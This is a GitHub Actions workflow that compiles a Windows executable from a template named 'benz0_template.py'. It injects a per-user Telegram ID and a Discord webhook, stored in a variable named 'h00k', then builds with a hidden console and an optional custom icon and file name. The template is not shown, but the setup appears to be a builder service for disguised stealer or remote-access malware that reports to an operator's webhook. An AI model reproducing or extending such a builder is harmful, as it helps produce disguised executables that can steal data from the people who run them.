name: Build Executable

on:
  workflow_dispatch:
    inputs:
      user_id:
        description: 'Telegram User ID'
        required: true
        type: string
      discord_webhook:
        description: 'Discord Webhook URL'
        required: false
        type: string
      file_name:
        description: 'Output EXE file name'
        required: false
        default: 'benz0'
        type: string
      icon_base64:
        description: 'Base64 encoded icon string'
        required: false
        type: string

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install pyinstaller requests

      - name: Inject configurations into template
        env:
          USER_ID: ${{ github.event.inputs.user_id }}
          DISCORD_WEBHOOK: ${{ github.event.inputs.discord_webhook }}
        shell: python
        run: |
          import os
          import re

          user_id = os.environ.get("USER_ID", "")
          webhook = os.environ.get("DISCORD_WEBHOOK", "")

          # Читаем исходный файл-шаблон
          with open("benz0_template.py", "r", encoding="utf-8") as f:
              code = f.read()

          # Инжектируем ID пользователя и вебхук Дискорда
          code = code.replace('USER_ID = "REPLACE_ME"', f'USER_ID = "{user_id}"')
          code = re.sub(r'h00k\s*=\s*".*?"', f'h00k = "{webhook}"', code)

          # Записываем в целевой файл для компиляции
          with open("build_target.py", "w", encoding="utf-8") as f:
              f.write(code)

      - name: Decode icon if provided
        env:
          ICON_BASE64: ${{ github.event.inputs.icon_base64 }}
        shell: python
        run: |
          import base64
          import os

          icon_base64 = os.environ.get("ICON_BASE64", "")
          if icon_base64.strip():
              with open("icon.ico", "wb") as f:
                  f.write(base64.b64decode(icon_base64))
              print("Icon successfully decoded and saved.")
          else:
              print("No custom icon provided.")

      - name: Compile with PyInstaller
        shell: powershell
        run: |
          $fileName = "${{ github.event.inputs.file_name }}"
          if (Test-Path "icon.ico") {
              pyinstaller --onefile --noconsole --icon="icon.ico" --name="$fileName" build_target.py
          } else {
              pyinstaller --onefile --noconsole --name="$fileName" build_target.py
          }

      - name: Upload compiled artifact
        uses: actions/upload-artifact@v4
        with:
          name: benz0_${{ github.event.inputs.user_id }}
          path: dist/
          if-no-files-found: error
